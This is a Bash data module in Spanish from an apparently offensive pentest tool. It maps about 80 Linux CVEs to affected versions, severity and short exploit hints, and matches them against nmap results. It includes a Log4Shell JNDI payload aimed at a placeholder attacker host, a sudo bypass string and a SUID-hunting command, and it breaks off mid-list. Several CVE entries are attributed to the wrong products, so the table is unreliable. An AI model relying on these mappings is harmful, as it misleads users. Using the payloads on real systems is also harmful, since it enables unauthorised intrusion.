#!/bin/bash
# ============================================================
# cve_linux.sh - CVEs de Linux (Libreria)
#
# Que hace: base de datos de ~80 CVEs de Linux con descripcion,
#   productos afectados, exploit y severidad. Consultas para el
#   reporte guiado y vectores de privesc/lateral/post-enum.
#
# Exporta (se sourcea desde SMOKEME.sh):
#   Arrays    : CVE_LIN_DESCRIPTION, CVE_LIN_AFFECTED,
#               CVE_LIN_EXPLOIT, CVE_LIN_SEVERITY
#   Funciones : get_linux_cve_info, get_linux_cve_by_severity,
#               get_linux_cve_by_product, get_linux_privesc_vectors,
#               get_linux_lateral_movement, get_linux_post_enumeration,
#               linux_cve_terms
#
# No es ejecutable por si sola; es un modulo de datos.
# ============================================================

declare -gA CVE_LIN_DESCRIPTION
declare -gA CVE_LIN_AFFECTED
declare -gA CVE_LIN_EXPLOIT
declare -gA CVE_LIN_SEVERITY

# ============================================================
# KERNEL LOCAL PRIVILEGE ESCALATION
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2024-1086]="nf_tables LPE"
CVE_LIN_AFFECTED[CVE-2024-1086]="Linux 3.15 - 6.7.1"
CVE_LIN_EXPLOIT[CVE-2024-1086]="nf_tables_kernel_lpe (GitHub)"
CVE_LIN_SEVERITY[CVE-2024-1086]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2023-35829]="rkvfs LPE"
CVE_LIN_AFFECTED[CVE-2023-35829]="Linux 6.4-rc1 to 6.5-rc1"
CVE_LIN_EXPLOIT[CVE-2023-35829]="PoC available"
CVE_LIN_SEVERITY[CVE-2023-35829]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2023-0386]="OverlayFS LPE"
CVE_LIN_AFFECTED[CVE-2023-0386]="Linux 5.11 - 6.2"
CVE_LIN_EXPLOIT[CVE-2023-0386]="overlayfs_kernel_lpe"
CVE_LIN_SEVERITY[CVE-2023-0386]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2023-2640]="GameOverlayFS (Ubuntu)"
CVE_LIN_AFFECTED[CVE-2023-2640]="Ubuntu 20.04/22.04 kernels"
CVE_LIN_EXPLOIT[CVE-2023-2640]="OverlayFS override_creds"
CVE_LIN_SEVERITY[CVE-2023-2640]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2023-32629]="GameOver(lay) Ubuntu"
CVE_LIN_AFFECTED[CVE-2023-32629]="Ubuntu 15.04 - 23.04"
CVE_LIN_EXPLOIT[CVE-2023-32629]="GameOver(lay)"
CVE_LIN_SEVERITY[CVE-2023-32629]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2022-0847]="Dirty Pipe"
CVE_LIN_AFFECTED[CVE-2022-0847]="Linux 5.8 - 5.16.11, 5.15.25, 5.10.102"
CVE_LIN_EXPLOIT[CVE-2022-0847]="dirtypipe (GitHub)"
CVE_LIN_SEVERITY[CVE-2022-0847]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2022-2588]="Route4U LPE"
CVE_LIN_AFFECTED[CVE-2022-2588]="Linux 5.x - 6.x"
CVE_LIN_EXPLOIT[CVE-2022-2588]="route_lpe"
CVE_LIN_SEVERITY[CVE-2022-2588]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2016-5195]="Dirty COW"
CVE_LIN_AFFECTED[CVE-2016-5195]="Linux 2.6.22 - 4.8.3"
CVE_LIN_EXPLOIT[CVE-2016-5195]="dirtycow, dirtyc0w"
CVE_LIN_SEVERITY[CVE-2016-5195]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2022-0811]="Cr8escape (cRACKER)"
CVE_LIN_AFFECTED[CVE-2022-0811]="crTools < 3.0.0, 2.0.0-3.0.0"
CVE_LIN_EXPLOIT[CVE-2022-0811]="SSH injection"
CVE_LIN_SEVERITY[CVE-2022-0811]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2024-36971]="net/Route UAF LPE"
CVE_LIN_AFFECTED[CVE-2024-36971]="Linux 5.x - 6.x"
CVE_LIN_EXPLOIT[CVE-2024-36971]="Exploited in wild (Android)"
CVE_LIN_SEVERITY[CVE-2024-36971]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2025-0927]="HFS+ Heap Overflow LPE"
CVE_LIN_AFFECTED[CVE-2025-0927]="Linux 6.x"
CVE_LIN_EXPLOIT[CVE-2025-0927]="HFS+ filesystem exploit"
CVE_LIN_SEVERITY[CVE-2025-0927]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2023-35001]="nft_byteorder OOB Write LPE"
CVE_LIN_AFFECTED[CVE-2023-35001]="Linux 3.13 - 6.4.1"
CVE_LIN_EXPLOIT[CVE-2023-35001]="nftables OOB write"
CVE_LIN_SEVERITY[CVE-2023-35001]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2024-53150]="USB Audio OOB Read"
CVE_LIN_AFFECTED[CVE-2024-53150]="Linux 6.x"
CVE_LIN_EXPLOIT[CVE-2024-53150]="USB audio driver OOB"
CVE_LIN_SEVERITY[CVE-2024-53150]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2024-50302]="HID Core OOB Read"
CVE_LIN_AFFECTED[CVE-2024-50302]="Linux 6.x"
CVE_LIN_EXPLOIT[CVE-2024-50302]="Exploited in wild"
CVE_LIN_SEVERITY[CVE-2024-50302]="HIGH"

# ============================================================
# MISCONFIGURATION / SUID
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2021-4034]="PwnKit (pkexec)"
CVE_LIN_AFFECTED[CVE-2021-4034]="Polkit < 0.120 (all versions)"
CVE_LIN_EXPLOIT[CVE-2021-4034]="pwnkit (GitHub)"
CVE_LIN_SEVERITY[CVE-2021-4034]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2021-3156]="Baron Samedit (sudo)"
CVE_LIN_AFFECTED[CVE-2021-3156]="Sudo 1.8.2 - 1.9.5p1"
CVE_LIN_EXPLOIT[CVE-2021-3156]="sudoedit exploit"
CVE_LIN_SEVERITY[CVE-2021-3156]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2019-14287]="Sudo Bypass"
CVE_LIN_AFFECTED[CVE-2019-14287]="Sudo 1.8.28"
CVE_LIN_EXPLOIT[CVE-2019-14287]="sudo -u#-1"
CVE_LIN_SEVERITY[CVE-2019-14287]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2023-22809]="Sudo Edit Bypass"
CVE_LIN_AFFECTED[CVE-2023-22809]="Sudo 1.8.0 - 1.9.12p1"
CVE_LIN_EXPLOIT[CVE-2023-22809]="sudoedit bypass"
CVE_LIN_SEVERITY[CVE-2023-22809]="HIGH"

# ============================================================
# SSH
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2023-38408]="OpenSSH Agent Fwd RCE"
CVE_LIN_AFFECTED[CVE-2023-38408]="OpenSSH < 9.3p2"
CVE_LIN_EXPLOIT[CVE-2023-38408]="ssh-agent PKCS11"
CVE_LIN_SEVERITY[CVE-2023-38408]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2018-15473]="OpenSSH User Enum"
CVE_LIN_AFFECTED[CVE-2018-15473]="OpenSSH < 7.7"
CVE_LIN_EXPLOIT[CVE-2018-15473]="ssh_user_enum.rb"
CVE_LIN_SEVERITY[CVE-2018-15473]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2006-5051]="OpenSSH Race Condition RCE"
CVE_LIN_AFFECTED[CVE-2006-5051]="OpenSSH < 4.3p2"
CVE_LIN_EXPLOIT[CVE-2006-5051]="OpenSSH < 4.3 exploit"
CVE_LIN_SEVERITY[CVE-2006-5051]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2023-48795]="Terrapin SSH Prefix Truncation"
CVE_LIN_AFFECTED[CVE-2023-48795]="OpenSSH 9.5, Async SSH 2.x"
CVE_LIN_EXPLOIT[CVE-2023-48795]="Terrapin attack"
CVE_LIN_SEVERITY[CVE-2023-48795]="MEDIUM"

# ============================================================
# FTP
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2011-2523]="Vsftpd 2.3.4 Backdoor"
CVE_LIN_AFFECTED[CVE-2011-2523]="vsftpd 2.3.4"
CVE_LIN_EXPLOIT[CVE-2011-2523]="netcat to port 6200"
CVE_LIN_SEVERITY[CVE-2011-2523]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2015-3306]="ProFTPD ModCopy RCE"
CVE_LIN_AFFECTED[CVE-2015-3306]="ProFTPD 1.3.5"
CVE_LIN_EXPLOIT[CVE-2015-3306]="SITE CPFR/CPTO"
CVE_LIN_SEVERITY[CVE-2015-3306]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2019-12815]="ProFTPD 1.3.6 RCE"
CVE_LIN_AFFECTED[CVE-2019-12815]="ProFTPD < 1.3.6b"
CVE_LIN_EXPLOIT[CVE-2019-12815]="mod_copy CAPA"
CVE_LIN_SEVERITY[CVE-2019-12815]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2017-7949]="ProFTPD SQL Injection"
CVE_LIN_AFFECTED[CVE-2017-7949]="ProFTPD < 1.3.6b"
CVE_LIN_EXPLOIT[CVE-2017-7949]="mod_sql injection"
CVE_LIN_SEVERITY[CVE-2017-7949]="HIGH"

# ============================================================
# HTTP / WEB SERVERS
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2021-41773]="Apache Path Traversal"
CVE_LIN_AFFECTED[CVE-2021-41773]="Apache 2.4.49"
CVE_LIN_EXPLOIT[CVE-2021-41773]="curl with encoded dots"
CVE_LIN_SEVERITY[CVE-2021-41773]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2021-42013]="Apache Path Traversal RCE"
CVE_LIN_AFFECTED[CVE-2021-42013]="Apache 2.4.50"
CVE_LIN_EXPLOIT[CVE-2021-42013]="double encoding bypass"
CVE_LIN_SEVERITY[CVE-2021-42013]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2017-9798]="Apache Optionsbleed"
CVE_LIN_AFFECTED[CVE-2017-9798]="Apache 2.2.x, 2.4.x"
CVE_LIN_EXPLOIT[CVE-2017-9798]="OPTIONS method memory leak"
CVE_LIN_SEVERITY[CVE-2017-9798]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2021-23017]="Nginx DNS Resolver Off-by-One"
CVE_LIN_AFFECTED[CVE-2021-23017]="Nginx < 1.21.1"
CVE_LIN_EXPLOIT[CVE-2021-23017]="DNS resolver overflow"
CVE_LIN_SEVERITY[CVE-2021-23017]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2019-20372]="Nginx HTTP Request Smuggling"
CVE_LIN_AFFECTED[CVE-2019-20372]="Nginx < 1.17.6"
CVE_LIN_EXPLOIT[CVE-2019-20372]="CL-TE smuggling"
CVE_LIN_SEVERITY[CVE-2019-20372]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2020-1938]="Ghostcat AJP"
CVE_LIN_AFFECTED[CVE-2020-1938]="Tomcat < 9.0.31"
CVE_LIN_EXPLOIT[CVE-2020-1938]="Ghostcat scanner"
CVE_LIN_SEVERITY[CVE-2020-1938]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2019-0232]="Tomcat CGI RCE"
CVE_LIN_AFFECTED[CVE-2019-0232]="Tomcat 9.0.0.M1-9.0.17"
CVE_LIN_EXPLOIT[CVE-2019-0232]="CGI servlet enableCmdLineArguments"
CVE_LIN_SEVERITY[CVE-2019-0232]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2024-23897]="Jenkins Arbitrary File Read"
CVE_LIN_AFFECTED[CVE-2024-23897]="Jenkins < 2.442, LTS < 2.426.3"
CVE_LIN_EXPLOIT[CVE-2024-23897]="CLI read file"
CVE_LIN_SEVERITY[CVE-2024-23897]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2022-22965]="Spring4Shell RCE"
CVE_LIN_AFFECTED[CVE-2022-22965]="Spring Framework < 5.3.18"
CVE_LIN_EXPLOIT[CVE-2022-22965]="class.module.classLoader"
CVE_LIN_SEVERITY[CVE-2022-22965]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2021-44228]="Log4Shell"
CVE_LIN_AFFECTED[CVE-2021-44228]="Log4j 2.0-beta9 - 2.14.1"
CVE_LIN_EXPLOIT[CVE-2021-44228]="${jndi:ldap://attacker/a}"
CVE_LIN_SEVERITY[CVE-2021-44228]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2018-11776]="Apache Struts RCE"
CVE_LIN_AFFECTED[CVE-2018-11776]="Struts 2.3 - 2.3.34, 2.5 - 2.5.16"
CVE_LIN_EXPLOIT[CVE-2018-11776]="Metasploit struts2_multi"
CVE_LIN_SEVERITY[CVE-2018-11776]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2017-5638]="Apache Struts2 RCE"
CVE_LIN_AFFECTED[CVE-2017-5638]="Struts 2.3.31, 2.5.10"
CVE_LIN_EXPLOIT[CVE-2017-5638]="Content-Type header RCE"
CVE_LIN_SEVERITY[CVE-2017-5638]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2022-42889]="Apache Text4Shell"
CVE_LIN_AFFECTED[CVE-2022-42889]="Apache Commons Text 1.5 - 1.9"
CVE_LIN_EXPLOIT[CVE-2022-42889]="${script:javascript:...} interpolation"
CVE_LIN_SEVERITY[CVE-2022-42889]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2023-46604]="Apache ActiveMQ RCE"
CVE_LIN_AFFECTED[CVE-2023-46604]="ActiveMQ < 5.18.3"
CVE_LIN_EXPLOIT[CVE-2023-46604]="ClassInfo descriptor RCE"
CVE_LIN_SEVERITY[CVE-2023-46604]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2023-4966]="Citrix Bleed (NetScaler)"
CVE_LIN_AFFECTED[CVE-2023-4966]="Citrix ADC/Gateway 14.1 < 14.1-8.50"
CVE_LIN_EXPLOIT[CVE-2023-4966]="Session token leak via HTTP request"
CVE_LIN_SEVERITY[CVE-2023-4966]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2023-44487]="HTTP/2 Rapid Reset DoS"
CVE_LIN_AFFECTED[CVE-2023-44487]="nginx, Apache, IIS, Caddy"
CVE_LIN_EXPLOIT[CVE-2023-44487]="Rapid RST_STREAM flood"
CVE_LIN_SEVERITY[CVE-2023-44487]="HIGH"

# ============================================================
# CMS / APPLICATIONS
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2019-6340]="Drupal Restful RCE"
CVE_LIN_AFFECTED[CVE-2019-6340]="Drupal 8.6.x < 8.6.10"
CVE_LIN_EXPLOIT[CVE-2019-6340]="JSON API node post"
CVE_LIN_SEVERITY[CVE-2019-6340]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2018-7600]="Drupalgeddon 2"
CVE_LIN_AFFECTED[CVE-2018-7600]="Drupal < 7.58, < 8.5.1"
CVE_LIN_EXPLOIT[CVE-2018-7600]="Drupalgeddon PoC"
CVE_LIN_SEVERITY[CVE-2018-7600]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2018-7601]="Drupalgeddon 3"
CVE_LIN_AFFECTED[CVE-2018-7601]="Drupal < 7.59, < 8.4.6, < 8.5.1"
CVE_LIN_EXPLOIT[CVE-2018-7601]="Drupal AJAX RCE"
CVE_LIN_SEVERITY[CVE-2018-7601]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2019-9978]="WordPress Social Warfare"
CVE_LIN_AFFECTED[CVE-2019-9978]="Social Warfare < 3.5.2"
CVE_LIN_EXPLOIT[CVE-2019-9978]="Stored XSS payload"
CVE_LIN_SEVERITY[CVE-2019-9978]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2019-6977]="WordPress MailPoet"
CVE_LIN_AFFECTED[CVE-2019-6977]="MailPoet < 3.0"
CVE_LIN_EXPLOIT[CVE-2019-6977]="PHP Object Injection"
CVE_LIN_SEVERITY[CVE-2019-6977]="HIGH"

# ============================================================
# DATABASES
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2017-12794]="MongoDB Express Template Injection"
CVE_LIN_AFFECTED[CVE-2017-12794]="mongo-express < 0.49.0"
CVE_LIN_EXPLOIT[CVE-2017-12794]="SSTI in mongo-express"
CVE_LIN_SEVERITY[CVE-2017-12794]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2014-3120]="Elasticsearch MVEL RCE"
CVE_LIN_AFFECTED[CVE-2014-3120]="Elasticsearch < 1.2.1"
CVE_LIN_EXPLOIT[CVE-2014-3120]="Dynamic scripting"
CVE_LIN_SEVERITY[CVE-2014-3120]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2015-1427]="Elasticsearch Groovy RCE"
CVE_LIN_AFFECTED[CVE-2015-1427]="Elasticsearch 1.1.x - 1.4.x"
CVE_LIN_EXPLOIT[CVE-2015-1427]="Groovy scripting"
CVE_LIN_SEVERITY[CVE-2015-1427]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2017-12635]="CouchDB JSON RCE"
CVE_LIN_AFFECTED[CVE-2017-12635]="CouchDB < 2.1.1"
CVE_LIN_EXPLOIT[CVE-2017-12635]="JSON object multiple keys"
CVE_LIN_SEVERITY[CVE-2017-12635]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2017-12636]="CouchDB OS Command Exec"
CVE_LIN_AFFECTED[CVE-2017-12636]="CouchDB < 2.1.1"
CVE_LIN_EXPLOIT[CVE-2017-12636]="_config section exec"
CVE_LIN_SEVERITY[CVE-2017-12636]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2019-9193]="PostgreSQL COPY RCE"
CVE_LIN_AFFECTED[CVE-2019-9193]="PostgreSQL 9.3 - 11.6"
CVE_LIN_EXPLOIT[CVE-2019-9193]="COPY FROM PROGRAM"
CVE_LIN_SEVERITY[CVE-2019-9193]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2020-14349]="PostgreSQL Privilege Escalation"
CVE_LIN_AFFECTED[CVE-2020-14349]="PostgreSQL 9.5 - 13.0"
CVE_LIN_EXPLOIT[CVE-2020-14349]="Default role grants"
CVE_LIN_SEVERITY[CVE-2020-14349]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2012-5615]="Oracle MySQL LPE"
CVE_LIN_AFFECTED[CVE-2012-5615]="MySQL < 5.5.54"
CVE_LIN_EXPLOIT[CVE-2012-5615]="UDF privilege escalation"
CVE_LIN_SEVERITY[CVE-2012-5615]="HIGH"

# ============================================================
# REDIS / MONGODB
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2019-10539]="Redis Pre-Auth RCE"
CVE_LIN_AFFECTED[CVE-2019-10539]="Redis < 5.0.5"
CVE_LIN_EXPLOIT[CVE-2019-10539]="CONFIG SET file write"
CVE_LIN_SEVERITY[CVE-2019-10539]="HIGH"

# ============================================================
# NETWORK SERVICES
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2013-5211]="NTP DDoS Amplification"
CVE_LIN_AFFECTED[CVE-2013-5211]="NTP < 4.2.7p26"
CVE_LIN_EXPLOIT[CVE-2013-5211]="ntpq -c monlist"
CVE_LIN_SEVERITY[CVE-2013-5211]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2017-6458]="NTP Buffer Overflow"
CVE_LIN_AFFECTED[CVE-2017-6458]="NTP < 4.2.3p3"
CVE_LIN_EXPLOIT[CVE-2017-6458]="Crafted packet"
CVE_LIN_SEVERITY[CVE-2017-6458]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2021-26708]="Avahi LPE"
CVE_LIN_AFFECTED[CVE-2021-26708]="Avahi < 0.8"
CVE_LIN_EXPLOIT[CVE-2021-26708]="Multicast DNS exploit"
CVE_LIN_SEVERITY[CVE-2021-26708]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2018-5764]="Rsync Info Disclosure"
CVE_LIN_AFFECTED[CVE-2018-5764]="Rsync < 3.1.3"
CVE_LIN_EXPLOIT[CVE-2018-5764]="Module listing"
CVE_LIN_SEVERITY[CVE-2018-5764]="MEDIUM"

# ============================================================
# SUPPLY CHAIN
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2024-3094]="XZ Utils Backdoor"
CVE_LIN_AFFECTED[CVE-2024-3094]="xz-utils 5.6.0-5.6.1"
CVE_LIN_EXPLOIT[CVE-2024-3094]="liblzma.so.5 backdoor, SSH auth bypass"
CVE_LIN_SEVERITY[CVE-2024-3094]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2023-4911]="Looney Tunables (glibc)"
CVE_LIN_AFFECTED[CVE-2023-4911]="glibc 2.34 - 2.39"
CVE_LIN_EXPLOIT[CVE-2023-4911]="GLIBC_TUNABLES ld.so exploit"
CVE_LIN_SEVERITY[CVE-2023-4911]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2023-6246]="glibc __vsyslog_internal Heap Overflow"
CVE_LIN_AFFECTED[CVE-2023-6246]="glibc < 2.39"
CVE_LIN_EXPLOIT[CVE-2023-6246]="Heap overflow in syslog"
CVE_LIN_SEVERITY[CVE-2023-6246]="HIGH"

# ============================================================
# SYSTEMD
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2023-7008]="systemd-resolved DNSSEC Bypass"
CVE_LIN_AFFECTED[CVE-2023-7008]="systemd < 252"
CVE_LIN_EXPLOIT[CVE-2023-7008]="DSKEYMETADATA signature bypass"
CVE_LIN_SEVERITY[CVE-2023-7008]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2022-3821]="systemd Buffer Overflow"
CVE_LIN_AFFECTED[CVE-2022-3821]="systemd < 251"
CVE_LIN_EXPLOIT[CVE-2022-3821]="Format string in networkd dhcp"
CVE_LIN_SEVERITY[CVE-2022-3821]="MEDIUM"

# ============================================================
# SSL/TLS
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2014-0160]="Heartbleed"
CVE_LIN_AFFECTED[CVE-2014-0160]="OpenSSL 1.0.1 - 1.0.1f"
CVE_LIN_EXPLOIT[CVE-2014-0160]="TLS heartbeat memory leak"
CVE_LIN_SEVERITY[CVE-2014-0160]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2014-3566]="POODLE"
CVE_LIN_AFFECTED[CVE-2014-3566]="SSL 3.0"
CVE_LIN_EXPLOIT[CVE-2014-3566]="Padding oracle on downgrade"
CVE_LIN_SEVERITY[CVE-2014-3566]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2016-2183]="SWEET32"
CVE_LIN_AFFECTED[CVE-2016-2183]="OpenSSL < 1.1.0"
CVE_LIN_EXPLOIT[CVE-2016-2183]="64-bit block cipher birthday attack"
CVE_LIN_SEVERITY[CVE-2016-2183]="MEDIUM"

# ============================================================
# CONTAINER / VIRTUALIZATION
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2019-5736]="Docker runc Container Escape"
CVE_LIN_AFFECTED[CVE-2019-5736]="Docker < 18.09.2"
CVE_LIN_EXPLOIT[CVE-2019-5736]="Overwrite runc binary"
CVE_LIN_SEVERITY[CVE-2019-5736]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2020-15257]="containerd Host Network LPE"
CVE_LIN_AFFECTED[CVE-2020-15257]="containerd < 1.4.3"
CVE_LIN_EXPLOIT[CVE-2020-15257]="shim API exploit"
CVE_LIN_SEVERITY[CVE-2020-15257]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2020-8558]="Kubernetes Node Proxy LPE"
CVE_LIN_AFFECTED[CVE-2020-8558]="Kubernetes < 1.18.8"
CVE_LIN_EXPLOIT[CVE-2020-8558]="Node proxy abuse"
CVE_LIN_SEVERITY[CVE-2020-8558]="MEDIUM"

CVE_LIN_DESCRIPTION[CVE-2024-21626]="runc Container Escape (Leaky Vessels)"
CVE_LIN_AFFECTED[CVE-2024-21626]="runc < 1.1.12"
CVE_LIN_EXPLOIT[CVE-2024-21626]="Leaky Vessels, fd leak via /proc/self/fd"
CVE_LIN_SEVERITY[CVE-2024-21626]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2022-0492]="cgroup Escape"
CVE_LIN_AFFECTED[CVE-2022-0492]="Linux 5.x - 5.16.10"
CVE_LIN_EXPLOIT[CVE-2022-0492]="release_agent exploit"
CVE_LIN_SEVERITY[CVE-2022-0492]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2022-0185]="fsconfig Heap Overflow"
CVE_LIN_AFFECTED[CVE-2022-0185]="Linux 5.1 - 5.16.2"
CVE_LIN_EXPLOIT[CVE-2022-0185]="Mount namespace escape"
CVE_LIN_SEVERITY[CVE-2022-0185]="CRITICAL"

# ============================================================
# WEBAPPS / FRAMEWORKS (agregados)
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2024-27198]="TeamCity Auth Bypass"
CVE_LIN_AFFECTED[CVE-2024-27198]="TeamCity < 2023.11.4"
CVE_LIN_EXPLOIT[CVE-2024-27198]="Alternative path bypass auth"
CVE_LIN_SEVERITY[CVE-2024-27198]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2023-46747]="F5 BIG-IP Auth Bypass"
CVE_LIN_AFFECTED[CVE-2023-46747]="F5 BIG-IP < 17.1.0.4"
CVE_LIN_EXPLOIT[CVE-2023-46747]="TMUI authentication bypass"
CVE_LIN_SEVERITY[CVE-2023-46747]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2023-20198]="Cisco IOS XE Auth Bypass"
CVE_LIN_AFFECTED[CVE-2023-20198]="Cisco IOS XE 16.x - 17.x"
CVE_LIN_EXPLOIT[CVE-2023-20198]="Web UI privilege escalation"
CVE_LIN_SEVERITY[CVE-2023-20198]="CRITICAL"

CVE_LIN_DESCRIPTION[CVE-2023-38545]="SOCKS5 Heap Buffer Overflow"
CVE_LIN_AFFECTED[CVE-2023-38545]="curl 7.69.0 - 8.3.0"
CVE_LIN_EXPLOIT[CVE-2023-38545]="Heap overflow via SOCKS5 proxy"
CVE_LIN_SEVERITY[CVE-2023-38545]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2024-6387]="OpenSSH regreSSHion RCE"
CVE_LIN_AFFECTED[CVE-2024-6387]="OpenSSH 8.5p1 - 9.7p1"
CVE_LIN_EXPLOIT[CVE-2024-6387]="Race condition in Signal Handler"
CVE_LIN_SEVERITY[CVE-2024-6387]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2024-24576]="bat-via-shell Bypass"
CVE_LIN_AFFECTED[CVE-2024-24576]="Rust-based bat < 0.24.0"
CVE_LIN_EXPLOIT[CVE-2024-24576]="Argument injection"
CVE_LIN_SEVERITY[CVE-2024-24576]="MEDIUM"

# ============================================================
# KERNEL 2024-2025
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2024-26920]="NF_tables UAF LPE"
CVE_LIN_AFFECTED[CVE-2024-26920]="Linux 5.x - 6.x"
CVE_LIN_EXPLOIT[CVE-2024-26920]="nf_tables use-after-free"
CVE_LIN_SEVERITY[CVE-2024-26920]="HIGH"

CVE_LIN_DESCRIPTION[CVE-2024-24557]="Docker Classic Builder Cache Poisoning"
CVE_LIN_AFFECTED[CVE-2024-24557]="Docker < 25.0.2"
CVE_LIN_EXPLOIT[CVE-2024-24557]="Build cache poisoning"
CVE_LIN_SEVERITY[CVE-2024-24557]="MEDIUM"

# ============================================================
# SSH RECENT
# ============================================================

# ============================================================
# DATABASES RECENT
# ============================================================

CVE_LIN_DESCRIPTION[CVE-2024-28793]="GeoServer OGC Filter SQL/RCE"
CVE_LIN_AFFECTED[CVE-2024-28793]="GeoServer < 2.23.6, < 2.22.4"
CVE_LIN_EXPLOIT[CVE-2024-28793]="OGC filter injection"
CVE_LIN_SEVERITY[CVE-2024-28793]="CRITICAL"

# ============================================================
# FUNCTIONS
# ============================================================

# Construye una lista de terminos (alias) para matchear contra CVE_LIN_AFFECTED
# a partir del nombre de servicio, producto y version reportados por nmap.
linux_cve_terms() {
    local svc="$1" prod="$2" ver="$3"
    local sl=$(to_lower "$svc")
    local pl=$(to_lower "$prod")
    local terms="$sl $pl $ver"

    case "$sl" in
        http|https)
            terms="$terms apache nginx tomcat iis lighttpd caddy httpd"
            ;;
        smb|microsoft-ds|netbios-ssn)
            terms="$terms smb samba"
            ;;
        ssh)
            terms="$terms openssh"
            ;;
        ftp)
            terms="$terms vsftpd proftpd"
            ;;
        mysql|ms-sql-s|ms-sql-m|mssql)
            terms="$terms mysql mssql sql"
            ;;
        postgresql|postgres)
            terms="$terms postgresql postgres"
            ;;
        ldap|389)
            terms="$terms ldap active directory kerberos windows"
            ;;
        redis)
            terms="$terms redis"
            ;;
        mongodb)
            terms="$terms mongodb mongo"
            ;;
        nfs)
            terms="$terms nfs"
            ;;
        dns)
            terms="$terms dns bind"
            ;;
        smtp)
            terms="$terms smtp postfix sendmail exim"
            ;;
        *)
            ;;
    esac
    echo "$terms"
}

get_linux_cve_info() {
    local service="$1"
    local product="${2:-}"
    local version="${3:-}"
    local result=""
    local count=0

    local terms=$(linux_cve_terms "$service" "$product" "$version")
    terms=$(echo "$terms" | tr ' ' '\n' | grep -v '^$' | sort -u | tr '\n' ' ')
    local pattern=$(build_cve_pattern "$terms")

    for cve in "${!CVE_LIN_DESCRIPTION[@]}"; do
        if [ -n "$pattern" ] && echo "${CVE_LIN_AFFECTED[$cve]}" | grep -qiE "$pattern"; then
            result="${result}  ${R}$cve${W} | ${CVE_LIN_DESCRIPTION[$cve]} | [${CVE_LIN_SEVERITY[$cve]}]\n"
            result="${result}    Exploit: ${CVE_LIN_EXPLOIT[$cve]}\n"
            count=$((count + 1))
        fi
    done

    if [ "$count" -eq 0 ]; then
        echo "  No se encontraron CVEs especificos para este servicio."
    else
        echo -e "$result"
    fi
}

get_linux_privesc_vectors() {
    cat << 'EOF'
  [LINUX - VECTORES DE ESCALADA]
  
  1. SUID BINARIES:
     find / -perm -4000 2>/dev/null
     # Consultar: https://gtfobins.github.io
     # Comunes exploitables:
